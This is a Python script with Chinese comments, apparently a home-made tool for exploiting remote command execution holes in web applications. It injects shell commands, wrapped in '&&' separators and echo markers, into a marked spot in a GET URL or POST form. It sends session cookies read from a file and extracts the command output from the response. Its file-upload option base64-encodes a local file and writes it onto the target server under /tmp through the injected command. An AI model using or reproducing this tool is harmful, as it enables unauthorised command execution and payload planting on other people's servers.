
import argparse
import requests
from urllib.parse import quote, unquote
import base64



def bannerPrint():
  banner = """

___    ___     _____         _____     ___       ______
\  \  /  /    /     \       |     \   |  |      /  ____|  
 \  \/  /    /  /_\  \      |  |\  \  |  |     /  / _____
  \    /    /  ____\  \     |  | \  \ |  |    |  | |_____|
   |  |    /  /     \  \    |  |  \  \|  |    |  |  |  |
   |__|   /__/       \__\   |__|   \_____|     \__\_|__|
"""

  print(banner)

##获取cookie
def getCookie(cookie_url):
    cookie = ""
    with open(cookie_url, "r") as file:
      cookie = file.read()
    cookies={}#初始化cookies字典变量
    for line in cookie.split(";"):   #按照字符：进行划分读取
    #其设置为1就会把字符串拆分成2份
      name,value=line.strip().split('=',1)
      cookies[name]=value  #为字典cookies添加内容
    return cookies





##通过url执行远程命令 -- post方式
def rceByUrlOfPost(url, cmd_str, cmd, data, cookie):
    #检查数据和模式匹配串
    if data == "":
        return "请传入data数据"
    if data.find(cmd_str) == -1:
        return "模式匹配串输入错误"
    if data.find(cmd_str) != data.rfind(cmd_str):
        return "模式匹配串不唯一，请重新定义"

    #获取cookie
    cookies = ""
    if cookie != "":
      cookies = getCookie(cookie)

    #开始post请求
    ##替换cmd，这里需要特别注意的是因为我们分解key-value是通过&所以这里的字符串里不能由多余的&
    ##因此要将&进行url编码，但是在post请求时表单中的数据回再一次url编码，导致后端无法获得&字符。所以我们一会在post之前还需要进行url解码
    ##浏览器中hackbar将&编码之后在做post请求时不会再进行二次url编码，因此没有可以直接对&编码进行请求
    ##dict数据做请求就相当于form表单。dict中的key-value在做请求的时候回做url编码
    cmd = "echo *#@* " + quote("&&") + cmd + quote("&&") + " echo *@#*"
    data = data.replace(cmd_str, cmd)
    ##将str转为dict
    data = tranStr(data)
    
    ##此时额dict已经相当于post的请求的form表单中的数据了，不需要由url编码的数据，所以要进行一次解码。将&解出来
    for key in data.keys():
        data[key] = unquote(data[key])
    response = requests.post(url, data = data, cookies=cookies).text
    start = response.rfind("*#@*")
    end = response.rfind("*@#*")
    return response[start + 4 : end]

    



##通过url执行远程命令 -- get方式
def rceByUrlOfGet(url, cmd_str, cmd, cookie):
    #检查模式匹配串是否出啊如正确（可搜索且唯一）
    if url.find(cmd_str) == -1:
        return "模式匹配串输入错误"
    if url.find(cmd_str) != url.rfind(cmd_str):
        return "模式匹配串不唯一，请重新定义"
    #获取cookie
    cookies = ""
    if cookie != "":
      cookies = getCookie(cookie)
    #开始进行get请求
    ##处理url
    cmd = quote("echo *#@* && " + cmd + " && echo *@#*")
    url = url.replace(cmd_str, cmd)
    ##进行请求（注意url编码）
    response = requests.get(url,cookies=cookies).text
    start = response.rfind("*#@*")
    end = response.rfind("*@#*")
    return response[start + 4 : end]





##转换字符串为post需要的form表达形式，最终返回字典形式（相当于表单）
def tranStr(data):
    ##按照&符号进行key-value分割。如果key或者value中包含&，请自行进行url编码在进行参数传输（浏览器中也是如此）
    data = data.split("&")
    data_dict = {}
    for i in range(len(data)):
        ##按照第一个等于号"="进行key和value的分割，后面的“=”为value的一部分
        index = data[i].find("=")
        print()
        data_dict[data[i][:index]] = data[i][index + 1 : ]
    return data_dict





##分析burptxt的内容获取 攻击url headers data
# def AnalyzeBurp(burp_txt):
#     #获取请求请求方式
#     if "GET" in burp_txt[0][:4]:
#         method = "get"
#     else:
#         method = "post"
#     #获取请求url
#     url_start = burp_txt[0].find(" ")
#     url_end = burp_txt[0].rfind(" ")
#     url = burp_txt[0][url_start + 1 : url_end].strip(" ")
#     host = burp_txt[1][burp_txt[1].find(":") + 1:].strip("\n").strip(" ")
#     url = host + url
#     print(method)
#     print(url)
    
        



##通过burp导出数据包
# def RceBurp():
#     http_txt = ""
#     with open("D:\\ip\\burp.txt", "r") as file:
#             http_txt = file.readlines()
#     AnalyzeBurp(http_txt)
#     return 




#上传文件
def UploadFile(file_url):
    content = ""
    #这里需要读取字节，因为存在二进制文件
    with open(file_url, "rb") as file:
        content = file.read()
    ##将文件转为base64，获取的是base64字节
    encoded_data = base64.b64encode(content)
    content = bytes.decode(encoded_data) #将base64字节串转为base64字符串
    return content

    return




def main():
    parser = argparse.ArgumentParser(description='new')
    ## --src\-s 均可使用，metavar用来生成帮助信息，required表明这个参数是必须有的，dest指参数的名称，action指执行的逻辑,help是帮助信息,type是指参数类型
    ##获取存在RCE漏洞的url
    parser.add_argument("--url","-u",metavar='rce_url',required=False, dest='rce_url',help='存在RCE的url功能点',type=str, default="")
    ##传入特定的模式匹配串，标明字符串的替换位置
    parser.add_argument("--cmd_str","-cs",metavar='cmd_str',required=False, dest='cmd_str', default="cmd", type=str, help="命令字符串的位置，默认为cmd")
    ##获取要执行的命令
    parser.add_argument("--cmd","-c",metavar='cmd',required=False, dest='cmd', default="whoami", type=str, help="要执行的命令，默认为whoami")


    ##获取请求url的方式默认为get
    parser.add_argument("--method","-m",metavar='method',required=False, dest='method', default="get", type=str, help="请求url的方法，默认为get")
    ##如果是post传递需要传入data数据
    parser.add_argument("--data",metavar='data',required=False, dest='data', default="", type=str, help="post方式需要传递数据")
    ##传入cookie
    parser.add_argument("--cookie",metavar='cookie',required=False, dest='cookie', default="", type=str, help="传入cookie的文件")

    ##传入一个burp的数据包
    parser.add_argument("-r",metavar='txt_burpsuit',required=False, dest='burp_txt', default="", type=str, help="传入一个burp的数据包")

    ##上传文件
    parser.add_argument("-f",metavar='file',required=False, dest='file', default="", type=str, help="要上传文件")
    parser.add_argument("-o",metavar='output',required=False, dest='output', default="/tmp/yangsir", type=str, help="上传文件的位置，推荐/tmp")



    args = parser.parse_args()
    ##打印banner
    bannerPrint()


    ##获取burp.txt
    # burp_txt = args.burp_txt
    # if burp_txt != "":
    #     RceBurp(burp_txt, args.cmd_str, args.cmd)

    #     return
    #获取要执行的命令
    cmd = args.cmd
    ##上传文件
    if args.file != "":
        content = UploadFile(args.file)
        ##定义文件输出的命令（目前只有linux版本，后续更新windows版本）
        cmd = "echo " + content + " |base64 -d > " + args.output 
    ##获取rce_url
    rce_url = args.rce_url
    if rce_url != "":
        #模式匹配串和请求方法
        cmd_str = args.cmd_str
        method = args.method
        cookie = args.cookie
        if method == 'get':
          print(rceByUrlOfGet(rce_url, cmd_str, cmd, cookie))
        else:
            data = args.data
            print(rceByUrlOfPost(rce_url, cmd_str, cmd, data, cookie))
        return
    





if __name__ == "__main__":
	main()